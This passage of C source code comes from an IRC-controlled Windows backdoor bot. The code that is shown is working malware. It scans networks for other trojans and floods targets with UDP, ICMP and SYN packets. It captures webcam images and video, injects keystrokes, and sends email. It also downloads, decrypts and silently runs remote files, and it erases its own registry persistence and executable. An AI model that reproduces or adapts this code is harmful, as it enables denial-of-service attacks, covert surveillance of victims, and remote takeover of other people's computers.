					if (strcmp(a[s+4],"doom") == 0) sscan.extra = 5;
					if (strcmp(a[s+4],"optix") == 0) sscan.extra = 6;
					
					if (strcmp(a[s+4],"log") == 0) {
						scanlogging = TRUE;
						sscan.extra = 10;
						char logdir[MAX_PATH];
						GetSystemDirectory(logdir, sizeof(logdir));
						sprintf(sscan.file ,"%s\\%s",logdir,scanlog);
						}

				sprintf(sendbuf, "[PortScan] \2%s\2 scanning %s:%d with a delay of %d seconds\r\n", a[s+4], inet_ntoa(sscan.addy), sscan.port, sscan.delay/1000);
				irc_privmsg(sock, a[2], sendbuf, notice);

				}
				if (a[s+4] == NULL) {
				sprintf(sendbuf, "[PortScan] scanning %s:%d with a delay of %d seconds\r\n", inet_ntoa(sscan.addy), sscan.port, sscan.delay/1000);
				irc_privmsg(sock, a[2], sendbuf, notice);
				}
				//sprintf(logbuf, "[PortScan] scanningx %s:%d", inet_ntoa(sscan.addy), sscan.port);
				sscan.threadnum = addthread(sendbuf);
				threads[sscan.threadnum] = CreateThread(NULL, 0, &ip_scan, (void *)&sscan, 0, &id);
				while(1) {
					if (sscan.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif

			else if (strcmp(rscan_cmd, a[s]) == 0 && a[s+4] != NULL) {
				// random scanner - rscan <a> <b> <port> <delay> - Aenox
				scans sscan;
				char range[56];

				srand(GetTickCount());
				sprintf(range, "%d.%d.%d.1", atoi(a[s+1]), atoi(a[s+2]), rand()%254 + 1);
				sscan.addy.S_un.S_addr = inet_addr(range);
				sscan.port = atoi(a[s+3]);
				sscan.delay = atoi(a[s+4]) * 1000;
				sscan.sock = sock;
				sscan.notice = notice;
				strncpy(sscan.chan,  a[2], sizeof(sscan.chan)-1);
				if (a[s+5] != NULL) {
					if (strcmp(a[s+5],"sub7") == 0) sscan.extra = 1;
					if (strcmp(a[s+5],"kuang") == 0) sscan.extra = 2;
					if (strcmp(a[s+5],"nb") == 0) sscan.extra = 3;
					if (strcmp(a[s+5],"devil") == 0) sscan.extra = 4;
					if (strcmp(a[s+5],"doom") == 0) sscan.extra = 5;
					if (strcmp(a[s+4],"optix") == 0) sscan.extra = 6;
					
					if (strcmp(a[s+5],"log") == 0) {
						scanlogging = TRUE;
						sscan.extra = 10;
						char logdir[MAX_PATH];
						GetSystemDirectory(logdir, sizeof(logdir));
						sprintf(sscan.file ,"%s\\%s",logdir,scanlog);
						}

				sprintf(sendbuf, "[RScan] \2%s\2 scanning %s:%d with a delay of %d seconds\r\n", a[s+5], inet_ntoa(sscan.addy), sscan.port, sscan.delay/1000);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				}

				if (a[s+5] == NULL) {
				sprintf(sendbuf, "[RScan] scanning %s:%d with a delay of %d seconds\r\n", inet_ntoa(sscan.addy), sscan.port, sscan.delay/1000);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				}
				
				sscan.threadnum = addthread(sendbuf);
				threads[sscan.threadnum] = CreateThread(NULL, 0, &ip_scan, (void *)&sscan, 0, &id);
				while(1) {
					if (sscan.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			/*else if (strcmp(spyscan_cmd,a[s]) == 0) {
					for (i=0;i <= 3;i++)
					if (scan[i].state == 0) break;
					if (i > 2) return 0; //all threads full
					if (strcmp("0",a[s+1]) == 0) { //we start at a random ip address
						srand(GetTickCount());
						sprintf(scan[i].ip,"%i.%i.%i.0",rand()%255,rand()%255,rand()%255);
					}
					else sprintf(scan[i].ip,a[s+1]);
					scan[i].port = atoi(a[s+2]);
					scan[i].delay = atoi(a[s+3]) * 1000;
					scan[i].extra = 0;
					if (a[s+4] != NULL) {
						if (strcmp(a[s+4],"sub7") == 0) scan[i].extra = 1;
						if (strcmp(a[s+4],"kuang") == 0) scan[i].extra = 2;
						if (strcmp(a[s+4],"devil") == 0) scan[i].extra = 4;
					}
					sprintf(scan[i].file,"\0");
					//sprintf(scan[i].chan,"\0");
					scan[i].sock = sendsock;
					//if (a[2] != NULL) sprintf(scan[i].chan,a[2]); //channel or query
					strncpy(scan[i].chan,  a[2], sizeof(scan[i].chan)-1);
					if (a[s+4] != NULL && scan[i].extra == 0) { //we are gonna log to a file
						char sysdir[MAX_PATH];
						GetSystemDirectory(sysdir, sizeof(sysdir));
						sprintf(scan[i].file,"%s\\%s",sysdir,a[s+4]);
					}
					Threat_Handle = CreateThread(NULL, 0, &port_scanner,(LPVOID)i, 0, &id);
					if (Threat_Handle) {	
						if (strlen(scan[i].file) > 2) sprintf(x,"scan ip: %s p: %i d: %s. logging to: %s",scan[i].ip,scan[i].port,a[s+3],scan[i].file);
						else sprintf(x,"scan ip: %s p: %i d: %s.",scan[i].ip,scan[i].port,a[s+3]);
						scan[i].thread = spyaddthread(x ,0,Threat_Handle,4,"\0");			
					}
					else 
						strcpy(x,"Error");
					irc_privmsg(sock, a[2], x, notice);
				}*/


			// commands requiring at least 4 parameters
			else if (a[s+4] == NULL) return 1;
			
			#ifndef NO_UDP
			else if (strcmp(udp_cmd, a[s]) == 0 ){
				ps udps;
				udps.silent = silent;
				strncpy(udps.host,  a[s+1], sizeof(udps.host)-1);
				udps.num = atoi(a[s+2]);
				udps.size = atoi(a[s+3]);
				udps.delay = atoi(a[s+4]);
				if (a[s+5] != NULL) udps.port = atoi(a[s+5]); else udps.port = 0;
				strncpy(udps.chan,  a[2], sizeof(udps.chan)-1);
				udps.sock = sock;
				sprintf(sendbuf, "UDP (%s)", udps.host);
				udps.threadnum = addthread(sendbuf);
				sprintf(sendbuf, "Sending %d UDP packets to: %s. Packet size: %d, Delay: %d[ms].\r\n", udps.num, udps.host, udps.size, udps.delay);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				threads[udps.threadnum] = CreateThread(NULL, 0, &udp, (void *)&udps, 0, &id);
				while(1) {
					if (udps.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			#ifndef NO_PING
			else if (strcmp(ping_cmd, a[s]) == 0){
				if (!noicmp) {
					ps pings;
					pings.silent = silent;
					strncpy(pings.host,  a[s+1], sizeof(pings.host)-1);
					pings.num = atoi(a[s+2]);
					pings.size = atoi(a[s+3]);
					pings.delay = atoi(a[s+4]);
					strncpy(pings.chan,  a[2], sizeof(pings.chan)-1);
					pings.sock = sock;
					sprintf(sendbuf, "Ping (%s)", pings.host);
					pings.threadnum = addthread(sendbuf);
					sprintf(sendbuf, "Sending %d pings to %s. packet size: %d, timeout: %d[ms]\r\n", pings.num, pings.host, pings.size, pings.delay);
					threads[pings.threadnum] = CreateThread(NULL, 0, &ping, (void *)&pings, 0, &id);
					while(1) {
						if (pings.gotinfo == TRUE) break;
						Sleep(50);
					}
				} else strncpy(sendbuf, "ICMP.dll not available", sizeof(sendbuf)-1);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
			#endif
		else if (strcmp(wccapture_cmd, a[s]) == 0 )
		{
			if (lstrlen(a[s+4]) == 0) return 0;
			if (CaptureFrame(a[s+1], atoi(a[s+2]), atoi(a[s+3]), atoi(a[s+4])) == 0)
			{
				sprintf(sendbuf, "Webcam capture saved to %s.\r\n", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				//send(sock, buffer, lstrlen(buffer), 0);
			}
			else
			{
				sprintf(sendbuf, "Error while capturing from webcam.\r\n");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				//send(sock, buffer, lstrlen(buffer), 0);
			}
		}

	  else if (strcmp(wcvideo_cmd, a[s]) == 0 )
		{
			if (lstrlen(a[s+5]) == 0) return 0;
			if (CaptureVideo(a[s+1], atoi(a[s+2]), atoi(a[s+3]), atoi(a[s+4]), atoi(a[s+5])) == 0)
			{
				sprintf(sendbuf, "Amateur video saved to %s.\r\n", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				//send(sock, buffer, lstrlen(buffer), 0);
			}
			else
			{
				sprintf(sendbuf, "Error while capturing amateur video from webcam.\r\n");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				//send(sock, buffer, lstrlen(buffer), 0);
			}
		}
	  else if (strcmp(sendkeys_cmd, a[s]) == 0)  { 
            x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2; 
            char *y = strstr(x, a[s+3]); 
            int c = 0; 
            int z; 
            char chr[2]; 
            for (unsigned int i = 0;i < strlen(y);i++) 
            { 
               memset(chr,0,sizeof(chr)); 
               chr[0] = y[i]; 
               for (c = 0;c < 92;c++) 
               { 

                  if (strcmp(chr,".") == 0) { //bold (ctrl + b) = RETURN 
                     Keyevent(VK_RETURN,FALSE); 
                     break; 
                  } 
                  else if (strcmp(chr,".") == 0) { //underlined (ctrl + u) = backspace 
                     Keyevent(VK_BACK,FALSE); 
                     break; 
                  } 
                  else if (strcmp(chr,outputL[c]) == 0) { 
                     z = inputL[c]; 
                     Keyevent(z,FALSE); 
                     break; 
                  } 
                  else if (strcmp(chr,outputH[c]) == 0) { 
                     z = inputL[c]; 
                     Keyevent(z,TRUE); 
                     break; 
                  } 
               } 
            } 
            irc_privmsg(sock, a[2], "Succesfully sent keys to the active window.", notice); 
         } 
		    else if (strcmp(email_cmd, a[s]) == 0 ) {
				WORD version = MAKEWORD(1,1);
				WSADATA wsaData;
				char server[256];
				int port;
				char sender_email[256];
				char recp_email[256];
				char subject[256];
				char BigBuf[1024];
				char myBuf[256];
				int nRet;
				strcpy(server,a[s+1]);
				port = atoi(a[s+2]);
				strcpy(sender_email,a[s+3]);
				strcpy(recp_email,a[s+4]);
				strcpy(subject,replacestr(a[s+5],"_"," "));
				WSAStartup(version, &wsaData);
				LPHOSTENT lpHostEntry;
				lpHostEntry = gethostbyname(server);
				SOCKET MailSocket;
				MailSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				SOCKADDR_IN saServer;
				saServer.sin_family = AF_INET;
				saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
				saServer.sin_port = htons(port);
				sprintf(BigBuf,"helo $rndnick\nmail from: <%s>\nrcpt to: <%s>\ndata\nsubject: %s\nfrom: %s\n%s\n.\n",sender_email,recp_email,subject,sender_email,subject);
				nRet = connect(MailSocket, (LPSOCKADDR)&saServer, sizeof(struct sockaddr));
				nRet = recv(MailSocket, myBuf, sizeof(myBuf), 0);
				nRet = send(MailSocket,  BigBuf, strlen(myBuf), 0);
				nRet = recv(MailSocket, myBuf, sizeof(myBuf), 0);
				closesocket(MailSocket);
				WSACleanup();
				sprintf(sendbuf, "email sent to %s",recp_email);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
			// 5 parameters
			//else if (a[s+5] == NULL) return 1;
			
		}
	}
	return repeat;
 }





// search-and-replace function for strings
 char * replacestr(char *str, char *oldstr, char *newstr)
 {
	char *p;
	char str2[512];
	char str3[512];
	char str4[512];

	memset(str2, 0, sizeof(str2));
	memset(str3, 0, sizeof(str3));
	memset(str4, 0, sizeof(str4));
	strncpy(str2,  str, sizeof(str2)-1);
	if (strlen(newstr) > 384) newstr[384] = '\0';

	while (strstr(str2, oldstr) != NULL) {
		p = strstr(str2, oldstr);
		strncpy(str4,  p + strlen(oldstr), sizeof(str4)-1);
		p[0] = '\0';
		strncpy(str3,  str2, sizeof(str3)-1);
		if (p+1 != NULL && oldstr-1 != NULL) if (strlen(p+1) > strlen(oldstr-1)) sprintf(str2, "%s%s%s", str3, newstr, str4);
		 else sprintf(str2, "%s%s", str3, newstr);
		if (strstr(oldstr, newstr) != NULL) break;
	}
	strncpy(str,  str2, strlen(str2)+1);
	return str;
 }

 


 #ifndef NO_DOWNLOAD
// function for downloading files/updating
 DWORD WINAPI webdownload(LPVOID param)
 {
	char fbuff[512];
	char tstr[256];
	HANDLE fh, f;
	DWORD r, d, start, total, speed;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	ds dl;
	dl = *((ds *)param);
	ds *dsp = (ds *)param;
	dsp ->gotinfo = TRUE;
	fh = InternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {

		// open the file
		f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			if (!dl.silent) {
				sprintf(fbuff,"Couldn't open %s.",dl.dest);
				irc_privmsg(dl.sock,dl.chan,fbuff,dl.notice);
			}
			threads[dl.threadnum] = 0;
			threadd[dl.threadnum][0] = '\0';
			return 0;
		}

		total = 0;
		start = GetTickCount();

		char *fileTotBuff=(char *)malloc(512000);	//FIXME: Only checks first 500 kb
		do {
			memset(fbuff, 0, sizeof(fbuff));
			InternetReadFile(fh, fbuff, sizeof(fbuff), &r);
			if (dl.encrypted==TRUE) {
				Xorbuff(fbuff,r);
			}
			WriteFile(f, fbuff, r, &d, NULL);
			
			if ((total) < 512000)
			{
				//We have free bytes...
				//512000-total
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r) bytestocopy=r;
				memcpy(&fileTotBuff[total],fbuff,bytestocopy);
			}
			total+=r;
			if (dl.filelen) if (total>dl.filelen) break; //er, we have a problem... filesize is too big.
			if (dl.update != 1) sprintf(threadd[dl.threadnum], "File download (%s - %dkb transferred)", dl.url, total / 1024);
			 else sprintf(threadd[dl.threadnum], "update (%s - %dkb transferred)", dl.url, total / 1024);
		} while (r > 0);

		BOOL goodfile=TRUE;

		if (dl.filelen) {
			if (total!=dl.filelen) {
				goodfile=FALSE;
				sprintf(tstr,"Filesize is INCORRECT!!");
				irc_privmsg(dl.sock,dl.chan,tstr,dl.notice);
			}
		}

		speed = total / (((GetTickCount() - start) / 1000) + 1);

		CloseHandle(f);

		if (dl.expectedcrc) {
			unsigned long crc,crclength;
			sprintf(fbuff,"crc32([%lu], [%d])\n",fileTotBuff,total);
			crclength=total;
			if (crclength>512000) crclength=512000;
			crc=crc32(fileTotBuff,crclength);
			if (crc!=dl.expectedcrc) {
				goodfile=FALSE;
				irc_privmsg(dl.sock,dl.chan,"CRC failed!",dl.notice);
			}
			
		}
		free(fileTotBuff);



		if (goodfile==FALSE) goto badfile;

		
		//download isn't an update
		if (dl.update != 1) {
			sprintf(tstr, "Downloaded %.1f kb to %s @ %.1f kb/sec.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, dl.notice);

			if (dl.run == 1) {
				ShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) {
					sprintf(fbuff,"opened %s.",dl.dest);
					irc_privmsg(dl.sock,dl.chan,fbuff,dl.notice);
				}
			}

		// download is an update
		} else {
			sprintf(tstr, "Downloaded %.1f kb to %s @ %.1f kb/s. Updating...", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, dl.notice);

			memset(&sinfo, 0, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				uninstall();
				WSACleanup();
				exit(0);
			} else {
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "Update failed: Error executing file.", dl.notice);
			}
		}
	} else if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "Bad URL, or DNS Error.", dl.notice);
badfile:
	InternetCloseHandle(fh);

	threads[dl.threadnum] = 0;
	threadd[dl.threadnum][0] = '\0';
	return 0;
 }
 #endif
 
 #ifndef NO_NETINFO
// function used for netinfo
 char * netinfo(char *ninfo, char *host, SOCKET sock)
 {

	SOCKADDR sa;
	int sas;
	DWORD n;
	char ctype[8];
	char cname[128];

	// get connection type/name
	memset(cname, 0, sizeof(cname));
	memset(ctype, 0, sizeof(ctype));
	if (!noigcse) {
		fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0);
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) strncpy(ctype,  "Dial-up", sizeof(ctype)-1);
	 	else strncpy(ctype,  "LAN", sizeof(ctype)-1);
	} else {
		strncpy(ctype, "N/A", sizeof(ctype)-1);
		strncpy(cname, "N/A", sizeof(cname)-1);
	}

	// get ip address
	sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(ninfo, "[Connection type]: %s (%s) [Local IP address]: %d.%d.%d.%d [Connected from]: %s", ctype, cname, (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5], host);
	return ninfo; // return the netinfo string
 }
 #endif

 #ifndef NO_SYSINFO
// function used for sysinfo
 char * sysinfo(char *sinfo)
 {
	int total;
	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;

	GlobalMemoryStatus(&memstat); // load memory info into memstat
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo
	char *os;
	char os2[140];
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2003";
	else os = "??";

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion);
		os = os2;
	}

	total = GetTickCount() / 1000; // GetTickCount() / 1000 = seconds since os started.

	sprintf(sinfo, "[CPU]: %I64uMHz [RAM]: %dKB total, %dKB free [OS]: Windows %s (%d.%d, build %d) [Uptime]: %dd %dh %dm",
		cpuspeed(), memstat.dwTotalPhys / 1024, memstat.dwAvailPhys / 1024,
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60);
	return sinfo; // return the sysinfo string
 }


// cpu speed function
 unsigned __int64 cpuspeed(void)
 {
	unsigned __int64 startcycle;
	unsigned __int64 speed, num, num2;

	do {
		startcycle = cyclecount();
		Sleep(1000);
		speed = ((cyclecount()-startcycle)/100000)/10;
	} while (speed > 1000000); // if speed is 1000GHz+, then something probably went wrong so we try again =P

	// guess 'real' cpu speed by rounding raw cpu speed (something like 601mhz looks kinda tacky)
	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return speed;
 }

// asm for cpuspeed() (used for counting cpu cycles)
 #pragma warning( disable : 4035 )
 unsigned __int64 cyclecount(void)
 {
 	#if defined (__LCC__) // this code is for lcc
	unsigned __int64 count = 0;
	_asm ("rdtsc\n"
		  "mov %eax,%count\n");
	return count;

	#elif defined (__GNUC__) // this code is for GCC
	unsigned __int64 count = 0;
	__asm__ ("rdtsc;movl %%eax, %0" : "=r" (count));
	return count;

	#else // this code is for MSVC, may work on other compilers (ignore the warnings, MSVC is stupid...)
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
	#endif
 }
 #pragma warning( default : 4035 )
 #endif

 // function for removing the bot's registry entries and executable
 void uninstall(void)
 {
	HKEY key;
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	char cmdline[256];
	char tcmdline[256];
	char cfilename[256];
	char batfile[256];

	// remove our registry entries
	if (AutoStart) { 
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, runkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegDeleteValue(key, valuename); 
		RegCloseKey(key); 
 
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, servicekey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegDeleteValue(key, valuename); 
		RegCloseKey(key); 
 
		RegCreateKeyEx(HKEY_CURRENT_USER, runkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegDeleteValue(key, valuename); 
		RegCloseKey(key); 
	}

	sprintf(batfile, "%s\\r.bat", tempdir);
	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close
		WriteFile(f, "@echo off\r\n"
					 ":start\r\nif not exist \"\"%1\"\" goto done\r\n"
					 "del /F \"\"%1\"\"\r\n"
					 "del \"\"%1\"\"\r\n"
					 "goto start\r\n"
					 ":done\r\n"
					 "del /F %temp%\r.bat\r\n"
					 "del %temp%\r.bat\r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
		sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, cfilename); // build command line
		ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // put the name of the command interpreter into the command line

		// execute the batch file
		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
 }



int Split(char *inStr, void *saveArray)
{
/*
This will change x0A & x0D into x00 and return line pointers in saveArray[].
*/
	int i,j,index;

	char *lines[MAX_LINES];

	memset(lines,0,sizeof(lines));

	j=strlen(inStr);
	if (j<1) return -1;
	index=0;

	lines[index++]=inStr;


	for (i=0;i<j;i++) if ((inStr[i]=='\x0A') || (inStr[i]=='\x0D')) inStr[i]='\x0';

	//Now that all cr/lf have been converted to NUL, save the pointers...

	for (i=0;i<j;i++) {
		if ((inStr[i]=='\x0') && (inStr[i+1]!='\x0')) {
			/* We will use the NUL as a guide :) */
			if (index<MAX_LINES) lines[index++]=&inStr[i+1]; else break;	//CHECK :: Recently modified
		}
	}


	if (saveArray!=0) memcpy(saveArray,lines,sizeof(lines));
	return index;
}

SOCKET TCPConnect(unsigned long ip, unsigned short port, int timeout_seconds)
{
	SOCKET s;
	SOCKADDR_IN sin;
	unsigned long blockcmd=1;
	timeval t;
	int i;
	FD_SET rset;
	s=socket(AF_INET,SOCK_STREAM,0);
	if (s==INVALID_SOCKET) return INVALID_SOCKET;

	sin.sin_family=AF_INET;
	sin.sin_addr.S_un.S_addr=ip;
	sin.sin_port=htons(port);

	ioctlsocket(s,FIONBIO,&blockcmd);
	
	connect(s,(LPSOCKADDR)&sin,sizeof(sin));
	

	FD_ZERO(&rset);
	FD_SET(s,&rset);

	t.tv_sec=timeout_seconds;
	t.tv_usec=0;
	i=select(0,0,&rset,0,&t);
	if (i<=0) {
		closesocket(s);
		return SOCKET_ERROR;
	}
	blockcmd=0;
	ioctlsocket(s,FIONBIO,&blockcmd);
	return s;
}

unsigned long ResolveAddress(char *Host)
{
/*
Host may be an IP (1.2.3.4) *or* a host (eg: something.com)
So heres some code for handling it nicely :)
*/
	unsigned long ip;
	hostent *boo;

	ip=inet_addr(Host);
	if (ip==INADDR_NONE) {
		// Well, not a valid IP...
		boo=gethostbyname(Host);
		if (boo==NULL) return 0;
		memcpy(&ip,*boo->h_addr_list,4);	
	}


	return ip;
}


char *Xorbuff(char *buff,int buffLen)
{
	int i;
	for (i=0;i<buffLen;i++)
	{
		buff[i]^=prefix;
	}
	return buff;
}

// irc send functions

 void irc_send(SOCKET sock, char *msg) {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, "%s\r\n", msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }


 void irc_sendf(SOCKET sock, char *msg, char *str) {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2) {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str, str2);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice) {
	char msgbuf[512];
	char *action;

	memset(msgbuf, 0, sizeof(msgbuf));
	if (notice) action = "NOTICE"; else action = "PRIVMSG";
	sprintf(msgbuf, "%s %s :%s\r\n", action, dest, msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }
  //spy's privmsg
 BOOL privmsg(SOCKET sock,char *msg,char *chan) //function to send a privmsg or message to dcc chat 
 {
	char buffer[512];
	if (sock < 1) return FALSE; //invalid socket
	if (chan) //message to irc chan can also be a nickname
		sprintf(buffer,"%s %s :%s\n","PRIVMSG",chan,msg);
	else //send to dcc chat
		sprintf(buffer,"%s\n",msg);
	if (send(sock,buffer,strlen(buffer),0) < 1) return FALSE; //invalid socket??
	return TRUE;//ok return
 }



 #ifndef NO_UDP
// function for sending udp packets
 DWORD WINAPI udp(LPVOID param)
 {
	ps udp;
	SOCKADDR_IN ssin;
	LPHOSTENT hostent = NULL;
	IN_ADDR iaddr;
	SOCKET usock;
	int i;

	// socket setup
	udp = *((ps *)param);
	ps *udps = (ps *)param;
	udps->gotinfo = TRUE;
	char *host = udp.host;
	usock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	iaddr.s_addr = inet_addr(udp.host);
	if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(udp.host);
	if (hostent == NULL && iaddr.s_addr == INADDR_NONE) {
		if (!udp.silent) irc_sendf2(udp.sock, "PRIVMSG %s :Error sending packets to %s\r\n", udp.chan, host);
		threads[udp.threadnum] = 0;
		threadd[udp.threadnum][0] = '\0';
		return 0;
	}
	if (hostent != NULL) ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);
	else ssin.sin_addr = iaddr;

	srand(GetTickCount());
	if (udp.port == 0) ssin.sin_port = htons((rand() % 65500) + 1); else ssin.sin_port = 	htons(udp.port);
	if (udp.port < 1) udp.port = 1;
	if (udp.port > 65535) udp.port = 65535;

	udp.num = udp.num / 10;
	if (udp.delay == 0) udp.delay = 1;

	for (i = 0; i < udp.size; i++) pbuff[i] = (rand() % 255);
	while (udp.num-- > 0) {
		//change port every 10 packets (if one isn't specified)
		for (i = 0; i < 11; i++) {
			sendto(usock, pbuff, udp.size-(rand() % 10), 0, (LPSOCKADDR)&ssin, sizeof(ssin));
			Sleep(udp.delay);
		}
		if (udp.port == 0) ssin.sin_port = htons((rand() % 65500) + 1);
	}
	// free(ubuff);
	if (!udp.silent) irc_sendf2(udp.sock, "PRIVMSG %s :Finished sending packets to %s\r\n", udp.chan, host);

	threads[udp.threadnum] = 0;
	threadd[udp.threadnum][0] = '\0';
	return 0;
 }
 #endif

 #ifndef NO_PING
//  function for sending pings
 DWORD WINAPI ping(LPVOID param)
 {
	ps ping;
	HANDLE icmp;
	LPHOSTENT hostent = NULL;
	IN_ADDR iaddr;
	IPAddr ip;
	ICMP_ECHO_REPLY reply;
	int i;

	ping = *((ps *)param);
	ps *psp = (ps *)param;
	psp->gotinfo = TRUE;
	char *host = ping.host;

	icmp = (HANDLE)fIcmpCreateFile();

	iaddr.s_addr = inet_addr(ping.host);
	if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(ping.host);
	if ((hostent == NULL && iaddr.s_addr == INADDR_NONE) || icmp == INVALID_HANDLE_VALUE) {
		if (!ping.silent) irc_sendf2(ping.sock, "PRIVMSG %s :Error sending pings to %s\r\n", ping.chan, host);
		threads[ping.threadnum] = 0;
		threadd[ping.threadnum][0] = '\0';
		return 0;
	}
	if (hostent != NULL) ip = *(DWORD*)*hostent->h_addr_list;
	else ip = iaddr.s_addr;

	memset(&reply, 0, sizeof(reply));
	reply.RoundTripTime = 0xffffffff;

  	if (ping.size > 65500) ping.size = 65500;
	if (ping.delay < 1) ping.delay = 1;
	for (i = 0; i < ping.num; i++) {
		fIcmpSendEcho(icmp, ip, pbuff, ping.size, NULL, &reply, sizeof(ICMP_ECHO_REPLY), ping.delay);
	}

	fIcmpCloseHandle(icmp);
	if (!ping.silent) irc_sendf2(ping.sock, "PRIVMSG %s :Finished sending pings to %s\r\n", ping.chan, host);

	threads[ping.threadnum] = 0;
	threadd[ping.threadnum][0] = '\0';
	return 0;
 }
 #endif
 #ifndef NO_SYN
DWORD WINAPI synthread (LPVOID param) {
char *buff;
buff = "";
synt syn;
syn = *((synt *)param);
synt *syns = (synt *)param;
sprintf(buff, "Done with SYN flood [%iKB/s]\r\n", SYNFlood(syn.ip, syn.port, syn.length));
//MessageBox(0, syn.socket, "DEBUG", 0);
irc_privmsg(syn.socket, syn.chan, buff, syn.notice);
//irc_privmsg(sock, a[2], sendbuf, notice); 
threads[syn.threadnumber] = 0;
threadd[syn.threadnumber][0] = '\0';
return 0; 
}
 #endif

